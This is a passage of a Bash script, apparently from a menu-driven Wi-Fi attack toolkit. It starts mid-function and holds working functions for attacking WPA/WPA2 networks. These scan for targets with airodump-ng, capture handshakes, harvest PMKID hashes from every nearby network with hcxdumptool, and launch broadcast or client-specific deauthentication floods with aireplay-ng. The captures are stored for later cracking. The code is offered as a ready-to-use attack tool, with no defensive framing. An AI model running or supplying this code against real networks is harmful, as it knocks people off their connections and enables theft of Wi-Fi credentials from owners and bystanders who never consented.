    # Get PID of xterm
    local xterm_pid=$!
    
    # Wait for xterm to finish
    wait $xterm_pid
    
    # Process the scan results
    if [[ ! -f "${quick_scan_file}-01.csv" ]]; then
        dialog --title "Error" --msgbox "Scan failed or was interrupted. No networks were found." 6 60
        return 1
    fi
    
    # Parse the CSV to get a list of WPA/WPA2 networks
    local networks=()
    local bssids=()
    local channels=()
    local essids=()
    
    # Skip the first line (header)
    local skip_first=1
    local in_clients_section=0
    
    while IFS=, read -r line; do
        # Skip the first line (header)
        if [[ $skip_first -eq 1 ]]; then
            skip_first=0
            continue
        fi
        
        # Check if we've reached the "Station MAC" line which indicates the start of client section
        if [[ "$line" == *"Station MAC"* ]]; then
            in_clients_section=1
            continue
        fi
        
        # Skip client section
        if [[ $in_clients_section -eq 1 ]]; then
            continue
        fi
        
        # Extract data from the CSV
        local bssid
        local essid
        local channel
        local security
        
        # Parse the line to extract BSSID, ESSID, channel, and security
        bssid=$(echo "$line" | awk -F, '{print $1}' | tr -d ' ')
        essid=$(echo "$line" | awk -F, '{print $14}' | tr -d ' ')
        channel=$(echo "$line" | awk -F, '{print $4}' | tr -d ' ')
        security=$(echo "$line" | awk -F, '{print $6 $7 $8}' | tr -d ' ')
        
        # Skip empty lines or lines with no BSSID
        if [[ -z "$bssid" || "$bssid" == " " ]]; then
            continue
        fi
        
        # If ESSID is empty, use "Hidden Network"
        if [[ -z "$essid" || "$essid" == " " ]]; then
            essid="Hidden Network"
        fi
        
        # Only include WPA/WPA2 networks
        if [[ "$security" == *"WPA"* ]]; then
            # Add to arrays
            networks+=("$bssid" "$essid ($channel)")
            bssids+=("$bssid")
            channels+=("$channel")
            essids+=("$essid")
        fi
    done < "${quick_scan_file}-01.csv"
    
    # If no WPA/WPA2 networks found
    if [[ ${#networks[@]} -eq 0 ]]; then
        dialog --title "Error" --msgbox "No WPA/WPA2 networks were found in the scan." 6 50
        return 1
    fi
    
    # Show menu to select a network
    local selected_index
    selected_index=$(dialog --title "Select Network" --menu "Select a WPA/WPA2 network to capture handshake:" 20 76 10 "${networks[@]}" 3>&1 1>&2 2>&3)
    
    # If user cancelled
    if [[ -z "$selected_index" ]]; then
        return 0
    fi
    
    # Find the index of the selected network
    local index=0
    for ((i=0; i<${#bssids[@]}; i++)); do
        if [[ "${bssids[$i]}" == "$selected_index" ]]; then
            index=$i
            break
        fi
    done
    
    # Get the details of the selected network
    local target_bssid="${bssids[$index]}"
    local target_channel="${channels[$index]}"
    local target_essid="${essids[$index]}"
    
    # Create a temporary file for the handshake capture
    local handshake_file="${TEMP_DIR}/handshake"
    
    # Show information dialog
    dialog --title "Handshake Capture" --msgbox "Starting handshake capture on network:\nBSSID: $target_bssid\nESSID: $target_essid\nChannel: $target_channel\n\nWaiting for a handshake...\n\nYou may need to perform a deauthentication attack to force clients to reconnect.\n\nPress OK to start the capture.\n\nPress Ctrl+C in the capture window to stop." 15 70
    
    # Start airodump-ng for the handshake capture
    log_message "Starting handshake capture on BSSID: $target_bssid (ESSID: $target_essid, Channel: $target_channel)"
    xterm -title "Handshake Capture" -geometry 100x30 -e "airodump-ng -w \"${handshake_file}\" --output-format pcap,csv --bssid \"$target_bssid\" -c \"$target_channel\" \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of airodump-ng xterm
    local capture_pid=$!
    
    # Ask if user wants to perform deauthentication to speed up the process
    if dialog --title "Deauthentication Attack" --yesno "Do you want to perform a deauthentication attack to speed up handshake capture?" 7 60; then
        # Start deauthentication attack
        xterm -title "Deauthentication Attack" -geometry 80x20 -e "aireplay-ng --deauth 10 -a \"$target_bssid\" \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
        local deauth_pid=$!
        
        # Wait for deauthentication to finish
        wait $deauth_pid
    fi
    
    # Wait for capture to finish
    wait $capture_pid
    
    # Check if handshake was captured
    if [[ -f "${handshake_file}-01.cap" ]]; then
        if aircrack-ng "${handshake_file}-01.cap" | grep -q "1 handshake"; then
            dialog --title "Success" --msgbox "Handshake successfully captured!" 6 40
            save_handshake "${handshake_file}-01.cap" "$target_essid" "$target_bssid"
        else
            dialog --title "Warning" --msgbox "Capture completed, but no handshake was detected. You may need to try again or run a deauthentication attack." 8 60
        fi
    else
        dialog --title "Error" --msgbox "Capture failed or was interrupted. No handshake was saved." 6 60
    fi
}

# Function to capture PMKID
capture_pmkid() {
    # First, perform a quick scan to get a list of available networks
    local quick_scan_file="${TEMP_DIR}/quick_scan_for_pmkid.csv"
    
    # Check if interface is in monitor mode
    if [[ $(is_monitor_mode "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "Interface is not in monitor mode. Please enable monitor mode first." 6 60
        return 1
    fi
    
    # Check if hcxdumptool is installed
    if ! command -v hcxdumptool &>/dev/null; then
        dialog --title "Error" --msgbox "hcxdumptool is not installed. It is required for PMKID capture." 6 60
        return 1
    fi
    
    # Check if hcxpcapngtool is installed
    if ! command -v hcxpcapngtool &>/dev/null; then
        dialog --title "Error" --msgbox "hcxpcapngtool is not installed. It is required for PMKID processing." 6 60
        return 1
    fi
    
    # Show information dialog
    dialog --title "PMKID Capture" --msgbox "This will attempt to capture PMKID hashes from nearby networks.\n\nPMKID capture does not require client connection or deauthentication.\n\nPress OK to start the capture.\n\nPress Ctrl+C in the capture window to stop." 12 60
    
    # Create temporary files
    local pmkid_cap_file="${TEMP_DIR}/pmkid.pcapng"
    local pmkid_hash_file="${TEMP_DIR}/pmkid_hash.txt"
    
    # Start hcxdumptool to capture PMKID
    log_message "Starting PMKID capture on all nearby networks"
    xterm -title "PMKID Capture" -geometry 100x30 -e "hcxdumptool -i \"$TARGET_INTERFACE\" -o \"$pmkid_cap_file\" --enable_status=1; read -p 'Press Enter to continue...'" &
    
    # Get PID of hcxdumptool xterm
    local capture_pid=$!
    
    # Wait for capture to finish
    wait $capture_pid
    
    # Process the capture file to extract PMKID hashes
    if [[ -f "$pmkid_cap_file" ]]; then
        # Convert pcapng to hash format
        if hcxpcapngtool -o "$pmkid_hash_file" "$pmkid_cap_file" &>/dev/null; then
            # Check if any PMKIDs were captured
            if [[ -f "$pmkid_hash_file" && -s "$pmkid_hash_file" ]]; then
                local pmkid_count
                pmkid_count=$(wc -l < "$pmkid_hash_file")
                dialog --title "Success" --msgbox "PMKID capture completed successfully!\n\n$pmkid_count PMKID hashes were captured." 8 50
                
                # Save PMKID hashes
                save_pmkid "$pmkid_hash_file" "" ""
            else
                dialog --title "Warning" --msgbox "Capture completed, but no PMKID hashes were found. You may need to try again or try a different location." 8 60
            fi
        else
            dialog --title "Error" --msgbox "Failed to process the capture file. No PMKID hashes were extracted." 6 60
        fi
    else
        dialog --title "Error" --msgbox "Capture failed or was interrupted. No PMKID data was saved." 6 60
    fi
}

# Function to perform deauthentication attack
perform_deauth_attack() {
    # First, perform a quick scan to get a list of available networks
    local quick_scan_file="${TEMP_DIR}/quick_scan_for_deauth.csv"
    
    # Check if interface is in monitor mode
    if [[ $(is_monitor_mode "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "Interface is not in monitor mode. Please enable monitor mode first." 6 60
        return 1
    fi
    
    # Show information dialog
    dialog --title "Scanning for Networks" --msgbox "Performing a quick scan to find available networks.\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window to stop the scan." 10 60
    
    # Start airodump-ng for a quick scan
    log_message "Starting quick scan to find networks for deauthentication attack"
    xterm -title "Finding Networks" -geometry 100x30 -e "airodump-ng -w \"${quick_scan_file}\" --output-format csv \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of xterm
    local xterm_pid=$!
    
    # Wait for xterm to finish
    wait $xterm_pid
    
    # Process the scan results
    if [[ ! -f "${quick_scan_file}-01.csv" ]]; then
        dialog --title "Error" --msgbox "Scan failed or was interrupted. No networks were found." 6 60
        return 1
    fi
    
    # Parse the CSV to get a list of networks
    local networks=()
    local bssids=()
    local channels=()
    local essids=()
    
    # Skip the first line (header)
    local skip_first=1
    local in_clients_section=0
    
    while IFS=, read -r line; do
        # Skip the first line (header)
        if [[ $skip_first -eq 1 ]]; then
            skip_first=0
            continue
        fi
        
        # Check if we've reached the "Station MAC" line which indicates the start of client section
        if [[ "$line" == *"Station MAC"* ]]; then
            in_clients_section=1
            continue
        fi
        
        # Skip client section
        if [[ $in_clients_section -eq 1 ]]; then
            continue
        fi
        
        # Extract data from the CSV
        local bssid
        local essid
        local channel
        
        # Parse the line to extract BSSID, ESSID, and channel
        bssid=$(echo "$line" | awk -F, '{print $1}' | tr -d ' ')
        essid=$(echo "$line" | awk -F, '{print $14}' | tr -d ' ')
        channel=$(echo "$line" | awk -F, '{print $4}' | tr -d ' ')
        
        # Skip empty lines or lines with no BSSID
        if [[ -z "$bssid" || "$bssid" == " " ]]; then
            continue
        fi
        
        # If ESSID is empty, use "Hidden Network"
        if [[ -z "$essid" || "$essid" == " " ]]; then
            essid="Hidden Network"
        fi
        
        # Add to arrays
        networks+=("$bssid" "$essid ($channel)")
        bssids+=("$bssid")
        channels+=("$channel")
        essids+=("$essid")
    done < "${quick_scan_file}-01.csv"
    
    # If no networks found
    if [[ ${#networks[@]} -eq 0 ]]; then
        dialog --title "Error" --msgbox "No networks were found in the scan." 6 40
        return 1
    fi
    
    # Show menu to select a network
    local selected_index
    selected_index=$(dialog --title "Select Network" --menu "Select a network to deauthenticate:" 20 76 10 "${networks[@]}" 3>&1 1>&2 2>&3)
    
    # If user cancelled
    if [[ -z "$selected_index" ]]; then
        return 0
    fi
    
    # Find the index of the selected network
    local index=0
    for ((i=0; i<${#bssids[@]}; i++)); do
        if [[ "${bssids[$i]}" == "$selected_index" ]]; then
            index=$i
            break
        fi
    done
    
    # Get the details of the selected network
    local target_bssid="${bssids[$index]}"
    local target_channel="${channels[$index]}"
    local target_essid="${essids[$index]}"
    
    # Set the channel for the deauthentication attack
    if ! set_channel "$TARGET_INTERFACE" "$target_channel"; then
        dialog --title "Error" --msgbox "Failed to set channel for deauthentication attack." 6 50
        return 1
    fi
    
    # Ask for number of deauthentication packets
    local num_packets
    num_packets=$(dialog --title "Deauthentication Attack" --inputbox "Enter the number of deauthentication packets to send (0 for continuous):" 8 60 "10" 3>&1 1>&2 2>&3)
    
    # If user cancelled
    if [[ -z "$num_packets" ]]; then
        return 0
    fi
    
    # Validate input
    if ! [[ "$num_packets" =~ ^[0-9]+$ ]]; then
        dialog --title "Error" --msgbox "Invalid input. Number of packets must be a number." 6 50
        return 1
    fi
    
    # Show options for deauthentication attack
    local deauth_option
    deauth_option=$(dialog --title "Deauthentication Attack" --menu "Select deauthentication method:" 15 60 3 \
        "1" "Deauthenticate all clients (broadcast)" \
        "2" "Deauthenticate specific client" \
        "3" "Cancel" 3>&1 1>&2 2>&3)
    
    case $deauth_option in
        1)
            # Broadcast deauthentication
            dialog --title "Deauthentication Attack" --msgbox "Starting broadcast deauthentication attack on:\nBSSID: $target_bssid\nESSID: $target_essid\nChannel: $target_channel\n\nAll clients will be deauthenticated.\n\nPress OK to start the attack.\n\nPress Ctrl+C in the attack window to stop." 15 60
            
            log_message "Starting broadcast deauthentication attack on BSSID: $target_bssid (ESSID: $target_essid, Channel: $target_channel)"
            xterm -title "Deauthentication Attack" -geometry 100x30 -e "aireplay-ng --deauth \"$num_packets\" -a \"$target_bssid\" \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
            
            # Get PID of xterm
            local xterm_pid=$!
            
            # Wait for xterm to finish
            wait $xterm_pid
            ;;
        2)
            # Client-specific deauthentication
            # First, we need to find clients connected to the target network
            local client_scan_file="${TEMP_DIR}/client_scan"
            
            dialog --title "Scanning for Clients" --msgbox "Scanning for clients connected to selected network.\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window when you've found a client." 10 60
            
            log_message "Scanning for clients connected to BSSID: $target_bssid"
            xterm -title "Client Scan" -geometry 100x30 -e "airodump-ng -w \"${client_scan_file}\" --output-format csv --bssid \"$target_bssid\" -c \"$target_channel\" \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
            
            # Get PID of xterm
            local scan_pid=$!
            
            # Wait for xterm to finish
            wait $scan_pid
            
            # Process the scan results
            if [[ ! -f "${client_scan_file}-01.csv" ]]; then
                dialog --title "Error" --msgbox "Scan failed or was interrupted. No clients were found." 6 60
                return 1
            fi
            
            # Parse the CSV to get a list of clients
            local clients=()
            local client_macs=()
            
            # Skip the first line (header) and find client section
            local skip_first=1
            local in_clients_section=0
            
            while IFS=, read -r line; do
                # Skip the first line (header)
                if [[ $skip_first -eq 1 ]]; then
                    skip_first=0
                    continue
                fi
                
                # Check if we've reached the "Station MAC" line which indicates the start of client section
                if [[ "$line" == *"Station MAC"* ]]; then
                    in_clients_section=1
                    continue
                fi
                
                # Only process client section
                if [[ $in_clients_section -eq 1 ]]; then
                    # Extract client MAC and AP
                    local client_mac
                    local client_ap
                    
                    client_mac=$(echo "$line" | awk -F, '{print $1}' | tr -d ' ')
                    client_ap=$(echo "$line" | awk -F, '{print $6}' | tr -d ' ')
                    
                    # Skip empty lines or lines with no client MAC
                    if [[ -z "$client_mac" || "$client_mac" == " " ]]; then
                        continue
                    fi
                    
                    # Only include clients connected to the target AP
                    if [[ "$client_ap" == "$target_bssid" ]]; then
                        clients+=("$client_mac" "Client for $target_essid")
                        client_macs+=("$client_mac")
                    fi
                fi
            done < "${client_scan_file}-01.csv"
            
            # If no clients found
            if [[ ${#clients[@]} -eq 0 ]]; then
                dialog --title "Error" --msgbox "No clients were found connected to the selected network." 6 60
                return 1
            fi
            
            # Show menu to select a client
            local selected_client
            selected_client=$(dialog --title "Select Client" --menu "Select a client to deauthenticate:" 15 70 8 "${clients[@]}" 3>&1 1>&2 2>&3)
            
            # If user cancelled
            if [[ -z "$selected_client" ]]; then
                return 0
            fi
            
            # Start the deauthentication attack against the specific client
            dialog --title "Deauthentication Attack" --msgbox "Starting targeted deauthentication attack on:\nBSSID: $target_bssid\nESSID: $target_essid\nClient: $selected_client\n\nPress OK to start the attack.\n\nPress Ctrl+C in the attack window to stop." 15 60
            
            log_message "Starting targeted deauthentication attack on BSSID: $target_bssid, Client: $selected_client"
            xterm -title "Targeted Deauthentication" -geometry 100x30 -e "aireplay-ng --deauth \"$num_packets\" -a \"$target_bssid\" -c \"$selected_client\" \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
            
            # Get PID of xterm
            local xterm_pid=$!
            
            # Wait for xterm to finish
            wait $xterm_pid
            ;;
        3|"")
            # Cancel
            return 0
            ;;
    esac
    
    dialog --title "Deauthentication Attack" --msgbox "Deauthentication attack completed." 6 40
}

# Function to capture both PMKID and Handshake
capture_all() {
    # First, perform a quick scan to get a list of available networks
    local quick_scan_file="${TEMP_DIR}/quick_scan_for_all.csv"
    
    # Check if interface is in monitor mode
    if [[ $(is_monitor_mode "$TARGET_INTERFACE") -ne 1 ]]; then
        dialog --title "Error" --msgbox "Interface is not in monitor mode. Please enable monitor mode first." 6 60
        return 1
    fi
    
    # Check if hcxdumptool is installed
    if ! command -v hcxdumptool &>/dev/null; then
        dialog --title "Error" --msgbox "hcxdumptool is not installed. It is required for PMKID capture." 6 60
        return 1
    fi
    
    # Show information dialog
    dialog --title "Scanning for Networks" --msgbox "Performing a quick scan to find available networks.\n\nPress OK to start the scan.\n\nPress Ctrl+C in the scan window to stop the scan." 10 60
    
    # Start airodump-ng for a quick scan
    log_message "Starting quick scan to find networks for combined capture"
    xterm -title "Finding Networks" -geometry 100x30 -e "airodump-ng -w \"${quick_scan_file}\" --output-format csv \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of xterm
    local xterm_pid=$!
    
    # Wait for xterm to finish
    wait $xterm_pid
    
    # Process the scan results
    if [[ ! -f "${quick_scan_file}-01.csv" ]]; then
        dialog --title "Error" --msgbox "Scan failed or was interrupted. No networks were found." 6 60
        return 1
    fi
    
    # Parse the CSV to get a list of WPA/WPA2 networks
    local networks=()
    local bssids=()
    local channels=()
    local essids=()
    
    # Skip the first line (header)
    local skip_first=1
    local in_clients_section=0
    
    while IFS=, read -r line; do
        # Skip the first line (header)
        if [[ $skip_first -eq 1 ]]; then
            skip_first=0
            continue
        fi
        
        # Check if we've reached the "Station MAC" line which indicates the start of client section
        if [[ "$line" == *"Station MAC"* ]]; then
            in_clients_section=1
            continue
        fi
        
        # Skip client section
        if [[ $in_clients_section -eq 1 ]]; then
            continue
        fi
        
        # Extract data from the CSV
        local bssid
        local essid
        local channel
        local security
        
        # Parse the line to extract BSSID, ESSID, channel, and security
        bssid=$(echo "$line" | awk -F, '{print $1}' | tr -d ' ')
        essid=$(echo "$line" | awk -F, '{print $14}' | tr -d ' ')
        channel=$(echo "$line" | awk -F, '{print $4}' | tr -d ' ')
        security=$(echo "$line" | awk -F, '{print $6 $7 $8}' | tr -d ' ')
        
        # Skip empty lines or lines with no BSSID
        if [[ -z "$bssid" || "$bssid" == " " ]]; then
            continue
        fi
        
        # If ESSID is empty, use "Hidden Network"
        if [[ -z "$essid" || "$essid" == " " ]]; then
            essid="Hidden Network"
        fi
        
        # Only include WPA/WPA2 networks
        if [[ "$security" == *"WPA"* ]]; then
            # Add to arrays
            networks+=("$bssid" "$essid ($channel)")
            bssids+=("$bssid")
            channels+=("$channel")
            essids+=("$essid")
        fi
    done < "${quick_scan_file}-01.csv"
    
    # If no WPA/WPA2 networks found
    if [[ ${#networks[@]} -eq 0 ]]; then
        dialog --title "Error" --msgbox "No WPA/WPA2 networks were found in the scan." 6 50
        return 1
    fi
    
    # Show menu to select a network
    local selected_index
    selected_index=$(dialog --title "Select Network" --menu "Select a WPA/WPA2 network for capture:" 20 76 10 "${networks[@]}" 3>&1 1>&2 2>&3)
    
    # If user cancelled
    if [[ -z "$selected_index" ]]; then
        return 0
    fi
    
    # Find the index of the selected network
    local index=0
    for ((i=0; i<${#bssids[@]}; i++)); do
        if [[ "${bssids[$i]}" == "$selected_index" ]]; then
            index=$i
            break
        fi
    done
    
    # Get the details of the selected network
    local target_bssid="${bssids[$index]}"
    local target_channel="${channels[$index]}"
    local target_essid="${essids[$index]}"
    
    # Create temporary files
    local combined_file="${TEMP_DIR}/combined"
    local pmkid_file="${TEMP_DIR}/pmkid.pcapng"
    local pmkid_hash_file="${TEMP_DIR}/pmkid_hash.txt"
    
    # Show information dialog
    dialog --title "Combined Capture" --msgbox "Starting combined PMKID and handshake capture on:\nBSSID: $target_bssid\nESSID: $target_essid\nChannel: $target_channel\n\nThis will attempt to capture both PMKID and WPA handshake.\n\nPress OK to start the capture.\n\nPress Ctrl+C in the capture windows to stop." 15 70
    
    # Start airodump-ng for handshake capture
    log_message "Starting combined capture on BSSID: $target_bssid (ESSID: $target_essid, Channel: $target_channel)"
    xterm -title "Handshake Capture" -geometry 100x30 -e "airodump-ng -w \"${combined_file}\" --output-format pcap,csv --bssid \"$target_bssid\" -c \"$target_channel\" \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    
    # Get PID of airodump-ng xterm
    local capture_pid=$!
    
    # Start hcxdumptool for PMKID capture with filtering for the target AP
    xterm -title "PMKID Capture" -geometry 100x30 -e "hcxdumptool -i \"$TARGET_INTERFACE\" -o \"$pmkid_file\" --enable_status=1 --filterlist_ap=\"$target_bssid\" --filtermode=2; read -p 'Press Enter to continue...'" &
    
    # Get PID of hcxdumptool xterm
    local pmkid_pid=$!
    
    # Start deauthentication attack
    xterm -title "Deauthentication Attack" -geometry 80x20 -e "aireplay-ng --deauth 10 -a \"$target_bssid\" \"$TARGET_INTERFACE\"; read -p 'Press Enter to continue...'" &
    local deauth_pid=$!
    
    # Wait for all processes to finish
    wait $deauth_pid
    
    # Ask user if they want to stop the capture
    if dialog --title "Capture Status" --yesno "Deauthentication completed. Do you want to stop the capture now?" 6 60; then
        # Kill the capture processes
        kill $capture_pid $pmkid_pid 2>/dev/null
        wait $capture_pid $pmkid_pid 2>/dev/null
    else
        # Wait for the captures to finish naturally
        dialog --title "Capture Status" --msgbox "Continuing with capture. Please manually close the capture windows when done." 6 60
        wait $capture_pid $pmkid_pid
    fi
    
    # Process PMKID capture
    if [[ -f "$pmkid_file" ]]; then
        # Convert pcapng to hash format
        if hcxpcapngtool -o "$pmkid_hash_file" "$pmkid_file" &>/dev/null; then
            # Check if any PMKIDs were captured
            if [[ -f "$pmkid_hash_file" && -s "$pmkid_hash_file" ]]; then
                local pmkid_count
                pmkid_count=$(wc -l < "$pmkid_hash_file")
                dialog --title "PMKID Capture" --msgbox "PMKID capture completed successfully!\n\n$pmkid_count PMKID hashes were captured." 8 50
                
                # Save PMKID hashes
                save_pmkid "$pmkid_hash_file" "$target_essid" "$target_bssid"
            else
                dialog --title "PMKID Capture" --msgbox "PMKID capture completed, but no PMKID hashes were found." 6 60
            fi
        else
            dialog --title "PMKID Capture" --msgbox "Failed to process the PMKID capture file." 6 50
        fi
    fi
    
    # Process handshake capture
    if [[ -f "${combined_file}-01.cap" ]]; then
        if aircrack-ng "${combined_file}-01.cap" | grep -q "1 handshake"; then
            dialog --title "Handshake Capture" --msgbox "Handshake successfully captured!" 6 40
            save_handshake "${combined_file}-01.cap" "$target_essid" "$target_bssid"
        else
            dialog --title "Handshake Capture" --msgbox "Handshake capture completed, but no handshake was detected." 6 60
        fi
    else
        dialog --title "Handshake Capture" --msgbox "Handshake capture failed or was interrupted." 6 50
    fi
}

# Function to view captured handshakes
view_captured_handshakes() {
    # Check if handshakes directory exists
    if [[ ! -d "${LOGS_DIR}/handshakes" ]]; then
        dialog --title "Error" --msgbox "No handshakes directory found." 6 40
        return 1
    fi
    
    # Find all capture files
    local handshake_files=()
    
    # Find .cap files
    while IFS= read -r file; do
        handshake_files+=("$(basename "$file")" "Handshake Capture")
    done < <(find "${LOGS_DIR}/handshakes" -name "*.cap" -type f | sort)
    
    # Find .txt files (PMKID)
    while IFS= read -r file; do
        handshake_files+=("$(basename "$file")" "PMKID Hash")
    done < <(find "${LOGS_DIR}/handshakes" -name "*.txt" -type f | sort)
    
    # If no handshake files found
    if [[ ${#handshake_files[@]} -eq 0 ]]; then
        dialog --title "Handshakes" --msgbox "No handshake or PMKID files found." 6 40
        return 1
    fi
    
    # Show menu to select a file
    local selected_file
    selected_file=$(dialog --title "Captured Handshakes/PMKIDs" --menu "Select a file to view details:" 20 76 10 "${handshake_files[@]}" 3>&1 1>&2 2>&3)
    
    # If user cancelled
    if [[ -z "$selected_file" ]]; then
        return 0
    fi
    
    # Find the full path of the selected file
    local full_path
    full_path=$(find "${LOGS_DIR}/handshakes" -name "$selected_file")
    
    # Check file type and display appropriate information
    if [[ "$selected_file" == *.cap ]]; then
        # For handshake files
        local info
        info=$(aircrack-ng "$full_path" | grep -A 2 "1 handshake")
        
        dialog --title "Handshake Details: $selected_file" --msgbox "File: $selected_file\nPath: $full_path\n\n$info" 15 70
    elif [[ "$selected_file" == *.txt ]]; then
        # For PMKID hash files
        local hash_count
        hash_count=$(wc -l < "$full_path")
        local first_hash
        first_hash=$(head -n 1 "$full_path")
        
        dialog --title "PMKID Details: $selected_file" --msgbox "File: $selected_file\nPath: $full_path\n\nContains $hash_count PMKID hash(es)\n\nFirst hash:\n$first_hash" 15 70
    fi
}
